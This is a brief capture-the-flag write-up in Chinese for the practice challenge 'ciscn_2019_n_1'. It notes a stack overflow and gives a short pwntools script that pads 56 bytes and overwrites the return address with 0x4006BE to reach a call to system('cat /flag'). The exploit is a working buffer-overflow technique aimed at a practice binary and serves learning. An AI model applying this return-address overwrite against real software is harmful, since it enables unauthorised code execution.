---
title: "ciscn_2019_n_1"
description: ""
date: 2023-03-29T04:25:55+08:00
lastmod: 2023-03-29T04:25:55+08:00
draft: false
images: []
weight: 1000
toc: true
type: docs
---

## 0x01 分析

![a8aed923a28e0698e3ed01725f26a47c](images/a8aed923a28e0698e3ed01725f26a47c.png)  

存在溢出点，可以直接覆盖函数返回地址为 `system("cat /flag")`

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
payload = b'a'*56 + p32(0x4006BE)
o.sendline(payload)
o.interactive()
```

![f113b22bf228f5af0121ac0630ce02f2](images/f113b22bf228f5af0121ac0630ce02f2.png)
